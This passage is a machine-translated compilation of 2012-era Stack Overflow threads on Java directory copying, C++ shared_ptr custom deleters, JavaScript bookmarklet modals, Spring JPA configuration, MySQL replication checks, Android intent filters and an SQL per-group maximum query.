当然**spring**也涵盖了[FileSystemUtils.copyRecursively(File src, File dest)](http://docs.spring.io/spring/docs/4.3.0.RC2/javadoc-api/org/springframework/util/FileSystemUtils.html#copyRecursively-java.io.File-java.io.File-)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-07-25T14:41:45.907

主要问题是这样的：

```
 dest.mkdir(); 
```

只创建一个目录，而不是父目录，第一步之后你需要创建两个目录，所以替换`mkdir`为`mkdirs`. 在那之后，我猜你会有重复的子目录，因为你的递归（像 C:\test\myfiles\mytest\dir1\dir1\subdir1\subdir1...），所以也尝试修复这些行：

```
 File destFile = new File(dest, src.getName());
    /**/
    OutputStream out = new FileOutputStream(new File(dest, src.getName())); 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2015-01-14T05:55:52.097

此代码将文件夹从源复制到目标：

```
 public static void copyDirectory(String srcDir, String dstDir)
    {

        try {
            File src = new File(srcDir);
            String ds=new File(dstDir,src.getName()).toString();
            File dst = new File(ds);

            if (src.isDirectory()) {
                if (!dst.exists()) {
                    dst.mkdir();
                }

                String files[] = src.list();
                int filesLength = files.length;
                for (int i = 0; i < filesLength; i++) {
                    String src1 = (new File(src, files[i]).toString());
                    String dst1 = dst.toString();
                    copyDirectory(src1, dst1);

                }
            } else {
                fileWriter(src, dst);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
public static void fileWriter(File srcDir, File dstDir) throws IOException
{
        try {
            if (!srcDir.exists()) {
                System.out.println(srcDir + " doesnot exist");
                throw new IOException(srcDir + " doesnot exist");
            } else {
                InputStream in = new FileInputStream(srcDir);
                OutputStream out = new FileOutputStream(dstDir);
                // Transfer bytes from in to out
                byte[] buf = new byte[1024];
                int len;
                while ((len = in.read(buf)) > 0) {
                    out.write(buf, 0, len);
                }
                in.close();
                out.close();

            }
        } catch (Exception e) {

        }
    } 
```

# c++ - shared_ptr 与非指针资源

> ID：11651903
> 
> 赞同：24
> 
> 时间：2012-07-25T14:20:25.890
> 
> 标签：c++, c++11, shared-ptr

在 C++11 中是否可以用来`shared_ptr`控制非指针资源？

* * *

可以`unique_ptr`用来管理非指针资源。这是通过实现一个自定义删除器类来完成的，该类提供：

1.  A `typedef {TYPE} pointer;`where`{TYPE}`是非指针资源类型
2.  `operator()(pointer)`释放受控资源

...然后`unique_ptr`使用自定义删除器实例化 a 作为第二个模板参数。

例如，在 Windows 下，可以创建一个`unique_ptr`管理[服务控制句柄](http://msdn.microsoft.com/en-us/library/windows/desktop/ms685104%28v=vs.85%29.aspx)。这种句柄类型不是通过调用释放的`delete`，而是通过调用释放的[`CloseServiceHandle()`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms682028%28v=vs.85%29.aspx)。这是执行此操作的示例代码：

## 自定义删除器

```
struct SvcHandleDeleter
{
    typedef SC_HANDLE pointer;
    SvcHandleDeleter() {};

    template<class Other> SvcHandleDeleter(const Other&) {};

    void operator()(pointer h) const
    {
        CloseServiceHandle(h);
    }
};

typedef std::unique_ptr<SC_HANDLE,SvcHandleDeleter> unique_sch; 
```

## 实例化

```
unique_sch scm(::OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS)); 
```

* * *

是否也可以用来`shared_ptr`控制非指针资源？

根据文档，[`shared_ptr`构造函数重载](http://en.cppreference.com/w/cpp/memory/shared_ptr/shared_ptr)提供了提供自定义删除器类的方法，但是没有一个构造函数接受既不是指针也不是指针包装器的资源类型。

如何才能做到这一点？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-25T14:52:02.817

可悲的是，`shared_ptr`对类型擦除的需求使得当前接口无法*准确*实现您想要的。`unique_ptr`设法做到这一点，因为它有关于实际删除器类型的静态信息，它可以从中绘制实际的“指针”类型。在`shared_ptr`的情况下，删除器类型在类型擦除过程中丢失（这就是您不能在`shared_ptr`模板中指定它的原因）。

另请注意，`unique_ptr`它不提供任何转换构造函数`shared_ptr`（例如`template<class Y> shared_ptr(Y* p)`）。它不能这样做，因为`pointer`不一定是真正的指针类型，因此它不能限制可以接受的内容（除了可能通过一些 SFINAE`std::is_convertible_to`或类似的东西......但我离题了）。

现在，一个明显的解决方法是简单地`new`处理资源句柄，这听起来很愚蠢。：/

```
std::shared_ptr<SC_HANDLE> sp(new SC_HANDLE(::OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS)),
    [](SC_HANDLE* p){ ::CloseServiceHandle(*p); delete p; }); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-25T14:42:52.773

好吧，一旦释放对指针的最后一个引用，shared_ptr 将调用指向对象的析构函数，然后可以释放类包含的任何内容。只是做一个类可能是这样的：

```
struct SvcHandle
{
  typedef SC_HANDLE pointer;
  SvcHandle()
  :M_handle(::OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS))
  { }

  ~SvcHandle()
  {
      CloseServiceHandle(M_handle);
  }
private:
  pointer M_handle;
}; 
```

然后只需使用新的 SvcHandle 创建一个共享指针。句柄的生命周期管理将与 shared_ptr - RAII 处于最佳状态。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:52:53.130

这个怎么样？

```
auto scm = make_shared<unique_sch>(::OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS)); 
```

**unique_sch**是您在问题中提到的课程。现在使用 scm 作为资源的共享指针。在需要时取消引用并不是最好的事情，但你确实问过这是否可能。

但这仍然使用指针。从文档中可以看出，**unique_ptr**类将**指针**类作为构造函数参数，它实际上可以是任何东西。 **然而shared_ptr**将一个类型作为模板参数，并在其构造函数中强制将其转换为指向该类型的指针：

> 模板< class Y, class Deleter > shared_ptr( **Y*** ptr, Deleter d );

我认为可以肯定地说它不能直接用于管理非指针资源，因为**shared_ptr**类假设其资源是指针。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:47:02.547

认为没有。由于标准为 shared_ptr 提供了这样的构造函数，而没有其他构造函数。

```
// 20.7.2.2.1, constructors:
constexpr shared_ptr() noexcept;
template<class Y> explicit shared_ptr(Y* p);
template<class Y, class D> shared_ptr(Y* p, D d);
template<class Y, class D, class A> shared_ptr(Y* p, D d, A a);
template <class D> shared_ptr(nullptr_t p, D d)
template <class D, class A> shared_ptr(nullptr_t p, D d, A a)
template<class Y> shared_ptr(const shared_ptr<Y>& r, T *p) noexcept;
shared_ptr(const shared_ptr& r) noexcept;
template<class Y> shared_ptr(const shared_ptr<Y>& r) noexcept;
shared_ptr(shared_ptr&& r) noexcept;
template<class Y> shared_ptr(shared_ptr<Y>&& r) noexcept;
template<class Y> explicit shared_ptr(const weak_ptr<Y>& r);
template<class Y> shared_ptr(auto_ptr<Y>&& r);
template <class Y, class D> shared_ptr(unique_ptr<Y, D>&& r);
constexpr shared_ptr(nullptr_t) : shared_ptr() { } 
```

例如，你想怎么做（对于 unique_ptr）

```
pointer release() noexcept; 
```

> 1 后置条件：get() == nullptr。2 返回： get() 在调用 release 开始时的值。

没有指针资源？你试图破解语言。这总是坏主意。

# javascript - 从书签加载模式窗口（如亚马逊愿望清单书签）

> ID：11651905
> 
> 赞同：9
> 
> 时间：2012-07-25T14:20:38.260
> 
> 标签：javascript, jquery, html, css

我正在使用一个小书签来加载一个 html 页面，这一切都很好，但是，由于浏览器通常在外面很难看，它看起来并不那么热！

有没有办法完全无框加载页面？就像它的 jquery 模态版本一样，我认为在页面内不可能，可以说是覆盖了它自己。

有没有办法可以在 document.write 命令中将页面扔掉，然后将它的 js 版本放在那里？还是其他方式？

亚马逊示例：

使用以下代码创建一个小书签，以更清楚地说明我的意思 - 如果您没有帐户，您会看到效果。

```
javascript:(function(){var%20w=window,l=w.location,d=w.document,s=d.createElement('script'),e=encodeURIComponent,o='object',n='AUWLBookenGB',u='https://www.amazon.co.uk/wishlist/add',r='readyState',T=setTimeout,a='setAttribute',g=function(){d[r]&&d[r]!='complete'?T(g,200):!w[n]?(s[a]('charset','UTF-8'),s[a]('src',u+'.js?loc='+e(l)+'&b='+n),d.body.appendChild(s),f()):f()},f=function(){!w[n]?T(f,200):w[n].showPopover()};typeof%20s!=o?l.href=u+'?u='+e(l)+'&t='+e(d.title):g()}()) 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-01T16:21:54.553

如果您只想在另一个页面上显示一些 html，您可以执行以下操作：

```
var modal = document.createElement('iframe');
modal.setAttribute('src', 'http://codinghorror.com');
modal.setAttribute('scrolling', 'no'); // no scroll bars on the iframe please
modal.className = 'modal';
document.body.appendChild(modal); 
```

带有一些基本样式：

```
.modal {
    border:0;            
    height:200px;
    position:fixed;
    right:20px;
    top:20px;
    width:200px;
    z-index:101;   
}​ 
```

当然，您应该从远程主机加载这些样式：

```
var c = document.createElement('link');
c.type = 'text/css';
c.rel = 'stylesheet';
c.href = '//example.com/main.css';
document.body.appendChild(c); 
```

所以你的书签看起来像：http: [//jsfiddle.net/radu/mTKHQ/](http://jsfiddle.net/radu/mTKHQ/)。这是本地托管的css，因为我没有费心将它上传到任何地方。现在，这是非常准系统的，显然你可以做更多的事情。首先，您可以编写自己的 DOM 而不是使用 iFrame。您可以添加关闭按钮、各种事件等。此时，执行 amazon 所做的操作并使用脚本/样式表加载器从远程主机加载文件是有意义的，如下所示：

```
(function (d) {
    var s = d.createElement('script');
    s.type = 'text/javascript';
    s.async = true;
    s.src = '//example.com/main.js';
    d.body.appendChild(s);
    var c = d.createElement('link');
    c.type = 'text/css';
    c.rel = 'stylesheet';
    c.href = '//example.com/main.css';
    d.body.appendChild(c);
}(document)); 
```

在前面加上`javascript:`，你就有了新的书签：

```
javascript:(function(d){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='//example.com/main.js';d.body.appendChild(s);var c=d.createElement('link');c.type='text/css';c.rel='stylesheet';c.href='//example.com/main.css';d.body.appendChild(c);}(document)); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T04:34:12.453

最简单、最轻量级的解决方案是使用`window.open`.

类似下面的内容将在屏幕中间显示一个 600x250 的窗口。只有标题栏会显示，它可以显示窗口的标题。

将此粘贴到浏览器的 URL 字段中以试用：

```
javascript:(function()%7Bvar%20d=document;window.open('http://stackoverflow.com','_blank','width=600,height=250,left='+(screen.width/2-300)+',top='+(screen.height/2-125))%7D)(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T23:00:46.177

```
javascript:(function()%20{if(typeof%20jQuery=='undefined'){var%20jqit=document.createElement('script');jqit.type='text/javascript';jqit.src='http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js';document.getElementsByTagName('head')[0].appendChild(jqit);}%20_my_script=document.createElement('script');_my_script.type='text/javascript';_my_script.src='http://font-friend.googlecode.com/svn/trunk/font-friend.js';document.getElementsByTagName('head')[0].appendChild(_my_script);})(); 
```

那是“font-friend”书签的代码，它在给定的站点上创建一个弹出窗口。您可以根据您的个人需求更改代码引用，但应该给出一个起点。

这是它的链接[http://somadesign.ca/projects/fontfriend/](http://somadesign.ca/projects/fontfriend/)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-07-30T14:52:01.573

仔细查看它，并检查出现的小书签，这里是整体代码结构：

```
 javascript: (function() { 
       var w = window, 
       l = w.location, 
       d = w.document, 
       s = d.createElement('script'), 
       e = encodeURIComponent, 
       x = 'undefined', 
       u = 'http://www.amazon.co.uk/wishlist/add'; 
       if (typeof s != 'object') l.href = u + '?u=' + e(l) + '&t=' + e(d.title); 
       function g() { 
          if (d.readyState && d.readyState != 'complete') { 
             setTimeout(g, 200); 
          } else { 
             // testing if AUWLBook is undefined (AUWL is their global object for it)
             // If it is, they add the <script> tag for their JS (variable u)
             if (typeof AUWLBook == x) s.setAttribute('src', u + '.js?loc=' + e(l)), 
             d.body.appendChild(s); 
             function f() { 
                // they keep looping through until the Object is finally created
                // Then they call the showPopover function which initializes everything
                // Builds all the HTML (with JS, etc)
                (typeof AUWLBook == x) ? setTimeout(f, 200) : AUWLBook.showPopover(); 
             } 
             f(); 
          } 
       } 
       g(); 
    }()) 
```

如您所见，正在创建一个匿名函数，这里发生的事情是他们正在创建一个脚本元素**s = d.createElement('script')**到您当前的文档中，然后加载书签的其余部分.

```
// since their global object will be undefined at first they create it
if (typeof AUWLBook == x) s.setAttribute('src', u + '.js?loc=' + e(l)), 
   d.body.appendChild(s); 
```

至于href的字符串构建......看起来`l.href = u + '?u=' + e(l) + '&t=' + e(d.title);`是为了他们的内部参考，所以他们知道你来自哪个页面/等，我假设他们正在构建愿望清单项目是从页面的标题（至少看起来是这样）。

你可以在这里看到他们的全部 JS 代码，他们有很多事情要做： [Amazong Bookmarklet JS Link](https://www.amazon.co.uk/wishlist/add.js?loc=http://fiddle.jshell.net/_display/&b=AUWLBookenGB)

但正如你所看到的，他们直接从 Javascript 构建整个弹出窗口和 DOM 元素：

```
 // (part of the AUWLBook object)
  showPopover : function(args){
  // etc etc...

  // open in window if it can't create a popover
  if (!this.canDisplayPopover()) {
    window.location.href = 'https://www.amazon.co.uk/wishlist/add' + '?u=' + encodeURIComponent(window.location) + '&t=' + encodeURIComponent(document.title);
    return;
  }

  // Then comes just an insane amount of lines of creating all the elements
  floater = shmCreateElement('table', { width: bookmarkletWidth, border: '0', id: 'auwlPopover' }, {position: 'absolute', zIndex: '999999999', width: bookmarkletWidth, tableLayout: 'auto', lineHeight: '100%', borderCollapse: 'collapse'}); 
```

shmCreateElement 是他们的内部 html 创建函数（我建议复制它）

```
 function shmCreateElement(tagName, props, styles, children) { ... } 
```

所以我想基本上你需要让你想要的东西完全来自 JS，把它注入到当前页面文档 DOM 中，然后就可以了。

# google-maps - Sencha Touch 2 应用程序在三星 Galaxy Ace 上不显示谷歌地图

> ID：11651907
> 
> 赞同：0
> 
> 时间：2012-07-25T14:20:48.033
> 
> 标签：google-maps, google-maps-api-3, extjs, sencha-touch-2, google-maps-markers

我编写了一个在地图上显示当前位置的应用程序。问题是它适用于 Galaxy Tab 10.1、HTC Desire、Desire Z、Galaxy S 但是当我使用三星 Galaxy Ace 或带有 Android 2.3.3 的模拟器时它不起作用 - 只显示灰屏。

代码：

```
Ext.define('MyApp.view.WhereAmI', {
extend: 'Ext.Container',
xtype: 'whereAmI',

config: {
    layout: 'fit',
    scrollable: true,
    styleHtmlContent: true,
    style: 'text-align: center; background-color:white;',

    items: 
    [
        {
            xtype: 'toolbar',
            docked: 'top',
            title: 'Where am I?',
            items: [
                {
                    ui: 'back',
                    xtype: 'button',
                    id: 'back',
                    text: 'Back'
                }
            ]       
        },
        {
            xtype: 'mapview'
        }
    ]
}
}); 
```

地图视图：

```
Ext.define("MyApp.view.MapView", {
    extend: "Ext.Map",
    xtype: 'mapview',
    config: {
        useCurrentLocation: true,
        mapOptions:{
            zoom: 14,
        },
        listeners: {
            maprender : function(comp, map){
                new google.maps.Marker({
                    position: new google.maps.LatLng(this._geo.getLatitude(), this._geo.getLongitude()),
                    map: map
                });                 
            },
        }
    },
}) 
```

当然在 index.html 中：

```
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=true"></script> 
```

有没有可能让它工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-26T11:40:07.773

我找到了解决方案。

问题出在设备设置中。

```
Settings -> Location and security -> My location -> Use wireless networks 
```

在我的设备上未选中。检查时它可以工作。

# objective-c - 如何从选定的 Twitter 帐户发送推文

> ID：11651913
> 
> 赞同：3
> 
> 时间：2012-07-25T14:21:07.683
> 
> 标签：objective-c, ios, cocoa-touch, twitter

在我的应用程序中，我想显示所有 Twitter 帐户列表，并允许用户选择其中一个来发送推文。如何从选定的帐户发送推文？是否可以？这是我的代码。我发送数据，但它总是使用第一个帐户...

```
ACAccountStore *accountStore = [[ACAccountStore alloc] init];
ACAccountType *accountType = [accountStore accountTypeWithAccountTypeIdentifier:ACAccountTypeIdentifierTwitter];
ACAccount *twitterAccount = [[accountStore accountsWithAccountType:accountType] objectAtIndex:0];
NSString *userName = [twitterAccount username];
NSLog(@"%@", userName);
TWTweetComposeViewController *twitter =
[[TWTweetComposeViewController alloc] init];
[twitter setInitialText:@"Hello"];
[twitter addURL:[NSURL URLWithString:_baseUrl]];
[tableViewController presentViewController:twitter animated:YES completion:nil]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:40:58.617

你总是选择第一个帐户的原因是因为你有这个：

```
ACAccount *twitterAccount = [[accountStore accountsWithAccountType:accountType] objectAtIndex:0]; 
```

为什么您仍然为用户选择帐户？您应该让用户决定他们想从哪个帐户发送推文。

此外，如果有多个帐户，Tweet Composer 应该可以选择使用哪个 Twitter 帐户。

# concurrency - 使用 Task 类启动线程线程

> ID：11651918
> 
> 赞同：1
> 
> 时间：2012-07-25T14:21:22.707
> 
> 标签：concurrency, junit, task, javafx-2

我想测试扩展 javafx.concurrent.Task 的任务类。我已经覆盖了调用方法：

```
 public class myTask extends Task<Void> {
     @Override
     protected Void call() throws Exception {
       while(!isCancelled()){
         doSth();
       }
       return null;
     }
   } 
```

然后我想用 JUnit 测试来测试该方法的调用：

```
public class MyTaskTest {
   @Test
   public void testCall() throws Exception {
     MyTask task = new MyTask();
     Thread th = new Thread(task);
     th.start();
     //.... further validation
   }
} 
```

但这无济于事。在启动的线程中没有执行调用方法。有人可以解释为什么会这样吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T16:42:11.447

JUnit 测试不会等待您的任务线程执行它需要执行的操作，并且会在 JUnit 线程完成后立即终止。您可以通过一个简单的示例查看该行为：

测试类：

```
public class Test1 implements Runnable {
    @Override
    public void run() {
        System.out.println("I'm tired");
        try {
            Thread.sleep(1000);
        } catch (InterruptedException ex) {
        }
        System.out.println("I'm done sleeping");
    }

} 
```

测试类：

```
public class Test1Test {
    @Test
    public void testRun() {
        Test1 task = new Test1();
        Thread th = new Thread(task);
        th.start();
        boolean yourTestedStuff = true;
        assertTrue(yourTestedStuff);
    }
} 
```

您会看到，当您运行测试时，它只打印“我累了”而不是“我睡完了”（它甚至可能不打印“我累了”，具体取决于线程的交错方式）。

您可以做的是将您的任务包装在一个可运行的文件中，并与 jUnit 线程进行某种形式的同步，例如通过 CountDownLatch，例如：

```
@Test
public void testRun() throws InterruptedException {
    final CountDownLatch latch = new CountDownLatch(1);
    final Test1 task = new Test1();
    Runnable r = new Runnable() { //wrap your task in a runnable

        @Override
        public void run() {
            task.run();  //the wrapper calls you task
            latch.countDown();  //and lets the junit thread when it is done
        }
    };
    Thread th = new Thread(r);
    th.start();
    assertTrue(latch.await(1000, TimeUnit.SECONDS)); //force junit to wait until you are done
    boolean yourTestedStuff = true;
    assertTrue(yourTestedStuff);
} 
```

# spring - 没有从 {classpath*:META-INF/persistence.xml} 解析的持久性单元

> ID：11651919
> 
> 赞同：12
> 
> 时间：2012-07-25T14:21:24.613
> 
> 标签：spring, persistence

使用 Spring Core 3.0.5、Hibernate 3.6.0。这个问题的标题是在使用我正在维护的应用程序启动 Tomcat 网络服务器（6.0.29）时引发的 java.lang.IllegalStateException 消息。

applicationContext.xml 说：

```
<bean id="emf" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean" scope="singleton">
   <property name="jpaVendorAdapter">
     <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter" />
  </property>
</bean> 
```

persistence.xml 位于项目包含的 jar 文件的 META-INF 目录中。Expedissimo.web.war 有一个带有上述 .jar 的 WEB-INF/classes 文件夹。

启动服务器时的完整异常回溯是：

> GRAVE: Exception lors de l'envoi de l'évènement contexte initialisé (context initialized) à l'instance de classe d'écoute (listener) org.springframework.web.context.ContextLoaderListener org.springframework.beans.factory.BeanCreationException: Error在 ServletContext 资源 [/WEB-INF/applicationContext.xml] 中创建名称为“emf”的 bean：调用 init 方法失败；嵌套异常是 java.lang.IllegalStateException: No persistence units parsed from {classpath*:META-INF/persistence.xml} at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1420) at org. springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519) 在 org.

```
... 36 more 
```

persistence.xml 说：

```
<persistence xmlns="http://java.sun.com/xml/ns/persistence"     xmlns:xsi="http://www.w3.org    /2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_2_0.xsd" version="2.0">
<persistence-unit name="serv2010pool" transaction-type="RESOURCE_LOCAL">
<provider>org.hibernate.ejb.HibernatePersistence</provider> 
    <properties>
        <property name="hibernate.show_sql" value="false" /> 
        <property name="hibernate.format_sql" value="true" /> 
        <property name="use_sql_comments" value="true" /> 
        <property name="hibernate.autocommit" value="false" /> 
        <property name="javax.persistence.jdbc.driver"     value="oracle.jdbc.OracleDriver"/>
        <property name="hibernate.dialect" value="org.hibernate.dialect.Oracle10gDialect"/>
        <property name="hibernate.connection.insee.poolName" value="serv2010pool" />
        <property name="hibernate.connection.provider_class" value=
            "fr.insee.config.hibernate.InseeConnectionProvider"/>           
    </properties>
</persistence-unit> 
```

相同的持久性单元描述符，当在批处理兄弟项目中的 Spring 外部使用时，可以从中找到并正确解析

```
 emf = Persistence.createEntityManagerFactory("serv2010pool"); 
```

批处理项目，就像 web 项目一样，包括 Serv2010-1.0.jar，其中有 META-INF/persistence.xml 。所有带注释的类都在这个公共 jar 中。

在 Eclipse v3.6 中部署会引发异常。.war 中的 WEB-INF/classes/ 文件夹没有 persistence.xml 文件。手动添加它并重新启动服务器没有帮助。

任何想法？我的技巧在这里用完了，感谢您提供任何技巧。克里斯

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-26T05:26:38.833

这通常意味着 Spring 找不到`persistence.xml`.

确保这`persistence.xml`与`META-INF`您的类路径有关。

这可能意味着您必须将文件放入`WEB-INF\classes\META-INF`，即使它看起来很奇怪。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2014-04-05T07:50:35.943

如果您使用的是 Maven，则 META-INF 文件夹应该放在 中`src/main/resources`，一旦文件在那里，问题就消失了。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-04-12T18:44:49.493

面临同样的问题。但是在 spring.xml 的 entityFactoryManagerBean 定义中添加“packagesToScan”属性后问题得到解决。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2016-02-02T02:01:45.517

您是否在 entityManagerFactory bean 中配置 packagesToScan 属性？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-07-12T16:56:11.953

就像对其他答案的补充一样：

我遇到了同样的问题，并且也在使用 maven。在错误消失之前，我必须重新进行清洁。对某些人来说可能很明显，但其他人可能会觉得这很有用。:)

# mysql - 如何确保复制已经发生

> ID：11651921
> 
> 赞同：0
> 
> 时间：2012-07-25T14:21:25.093
> 
> 标签：mysql, sql, replication

我有 2 个 5.0 MySQL 服务器在 Master-Master 复制中运行，在刷新内存中数据表示之前，我想确保两个数据库具有完全相同的内容。为此，我目前正在使用以下逻辑

1.  确保`Slave_IO_Running`&`Slave_SQL_Running`在两边都设置为 yes

2.  一方面`show master status;`是检索当前主文件和位置的问题

3.  另一方面`show slave status;`，检索`Master_Log_File`&的值`Exec_Master_Log_Pos`

4.  然后我比较两侧的值，如果第二侧的值相等或更高，我返回复制已经发生。

我知道 master 后面的字段 seconds 可能是检查[http://dev.mysql.com/doc/refman/5.5/en/show-slave-status.html](http://dev.mysql.com/doc/refman/5.5/en/show-slave-status.html)的另一种方法，但它说在慢速网络上它可能不会准确地说。

我问的主要原因是因为我一直看到这样的情况，其中一个主人的位置可能是 35000 而在奴隶上它只是在 2000 并且没有发生任何事情，好像显示奴隶状态所基于的目录没有更新及时。

我开始按照 percona 的工具包理念设计一种涉及校验和的替代验证方法。

热烈欢迎任何想法和建议！

干杯，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:28:09.007

`Seconds_Behind_Master`我没有使用Percona Toolkit 中的[pt-heartbeat](http://www.percona.com/doc/percona-toolkit/2.1/pt-heartbeat.html)来监控复制延迟。您可以使用该工具来确认您的辅助 master 是否已赶上主要 master，但如果您想比较两个 master 上的实际数据，我建议您使用[pt-table-checksum](http://www.percona.com/doc/percona-toolkit/2.1/pt-table-checksum.html)。

# android - 将带有反向链接的日历条目放置到应用程序

> ID：11651923
> 
> 赞同：0
> 
> 时间：2012-07-25T14:21:30.290
> 
> 标签：android, hyperlink, calendar, intentfilter

在我们的 App 中有一个“添加日历条目”功能，它会打开一个 Calendar-Entry-Edit-Activity。我想在消息中放置一个链接，用户可以单击该链接以返回我们的应用程序并提供其他信息。在 Manifest 中，我们有以下 Intent-filter 条目：

```
<intent-filter>
    <action android:name="android.intent.action.VIEW" / >
    <category android:name="android.intent.category.DEFAULT"
    <category android:name="android.intent.category.BROWSABLE"
    <data android:scheme="http" android:host="our.namespace.de" android:path="/search" />
</intent-filter> 
```

像这样在里面放一个链接：

`http://our.namespace.de/search/some_infos`

单击它会触发一个活动选择器，每个浏览器都会显示在该列表中。如何创建链接，只有我们的 App 监听？这里的问题是，除了 html 之外的任何其他类型都不会被识别为 Calendar-TextView 中的链接

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:42:45.037

`android:pathPrefix`如果您尝试匹配链接到的 URL，我认为应该是这样。

无论如何，启动应用程序的方法的一个缺点`http://`是它会启动除您的应用程序之外的所有浏览器。

您可以尝试使用`Intent`并[`toUri()`](http://developer.android.com/reference/android/content/Intent.html#toUri%28int%29)创建一个任意的表示`Intent`，并将其用作链接目标。

# biztalk - BizTalk 2009 单例业务流程以错误的顺序接收消息

> ID：11651924
> 
> 赞同：1
> 
> 时间：2012-07-25T14:21:30.333
> 
> 标签：biztalk, biztalk-2009

我有一个不寻常的问题——我有两个单例编排，我们称它们为 Singleton-A 和 Singleton-B。

Singleton-A 组装 Message-A 类型的消息，并通过直接绑定的编排端口将其发送到消息框。因为它是一个单例，所以它必须只在一个主机实例上运行。因此，每个 Message-A 都会以正确的顺序 1、2、3、4 等发送到消息框。我可以通过使用 HAT 来确认这是真的。

Singleton-B 订阅了 Message-A。Singleton-B 有一个逻辑接收端口，它通过它接收来自 Singleton-A 的消息。此接收端口已将 order 传递设置为 true。Singleton-B 当然也是单线程的。但是，当 Singleton-A 发送的消息被 Singleton-B 消费时，它们以错误的顺序 1、2、4、3... 等消费。再次查看 HAT，我可以看到这是真的。

Singleton-B 处理消息的顺序似乎完全不确定。这里发生了什么？订阅评估和/或主机队列排队过程是多线程的吗？假设 BizTalk 不支持单例业务流程之间的有序传递是否公平？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-05T14:24:17.137

这仍然是一个悬而未决的问题 - 我相信这是 BizTalk 中的一个错误。然而，我们重新设计了我们的解决方案，使单例编排永远不会直接绑定到其他单例编排的输出。

顺便说一句，这首先是一个糟糕的设计，因为 BizTalk 主要是为大容量、并行消息处理而设计的。

# sql-server - SQL SERVER 查询从所有帐户类型中获取帐户的 Max(Balance) 及其 ShareAccountHolderCount

> ID：11651930
> 
> 赞同：0
> 
> 时间：2012-07-25T14:21:35.990
> 
> 标签：sql-server

我正在尝试解决以下查询。请问你能帮忙吗？

**银行台 BT**

```
AccountNumber   AccountTypeCode     Balance         ShareAccountHolderCount
10800           2146                    160                 5
10800           2148                    126                 3
10800           2149                    84                  6
10800           2147                    66                  7
11039           2581                    42                  1
11039           2582                    32                  21
11039           2579                    10                  91
11039           2578                    7                   10 
```

**要求：** 1\. 一个账号（BT.AccountNumber）可能有多个AccountTypes（BT.AccountTypeCode）的账户，并且
对于每个账户类型，他可能有不同的余额（BT.Balance）。
2.在多个accounttype的账户下，他可能有多个共享账户持有人（BT.ShareAccountHolderCount）
3.我没有另一个表可以加入BANKTABLE

**问题：**现在我必须从所有帐户类型中为帐户选择 Max(Balance) 及其 ShareAccountHolderCount

结果应**如下**所示。

```
AccountNumber   AccountTypeCode     Balance         ShareAccountHolderCount
10800           2146                    160                 5
11039           2581                    42                  1 
```

根据我的研究
**答案 1：** TOP 1 和按余额排序 DESC 不适用于此要求。
**答案 2：**我正在尝试通过编写以下查询来做某事，但无法获得答案

```
SELECT AccountNumber,AccountTypeCode,Balance,ShareAccountHolderCount
        ,RowNumber = ROW_NUMBER() OVER (PARTITION BY AccountNumber ORDER BY  LongestStressdays DESC)
        ,RowNumber2 = ROW_NUMBER() OVER (PARTITION BY AccountNumber ORDER BY  CountOfTestTypeIdsperSequence DESC)
        FROM BANKTABLE BT 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:29:17.413

你快解决了。第二部分包括过滤行，以仅按分区获取第一行：

```
with cte as (
   SELECT 
       AccountNumber,
       AccountTypeCode,
       Balance,
       ShareAccountHolderCount,
       RowNumber = ROW_NUMBER() OVER (
               PARTITION BY AccountNumber 
               ORDER BY  Balance DESC)
   FROM BANKTABLEL BT
)
   select
     AccountNumber,
     AccountTypeCode,
     Balance,
     ShareAccountHolderCount
   from
     cte
   where RowNumber = 1 
```

# android - 如何设计建筑物的Android室内地图？

> ID：11651931
> 
> 赞同：16
> 
> 时间：2012-07-25T14:21:36.910
> 
> 标签：android, indoor-positioning-system

我想设计一个 Android 应用程序，它可以帮助学生和其他人在特定建筑物（一层）周围导航，显示通往教室的步行路线。

我需要帮助。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-01T06:27:09.000

这是你通常为你的论文开发的那种项目。乍一看，它更大，更复杂。

谷歌搜索你会发现很多关于这个主题的 BCS 和硕士论文。阅读它们，您将找到开发自己的系统所需的几乎所有信息。

作为起点，您可以使用 redpin：[http:](http://redpin.org/) //redpin.org/ 。

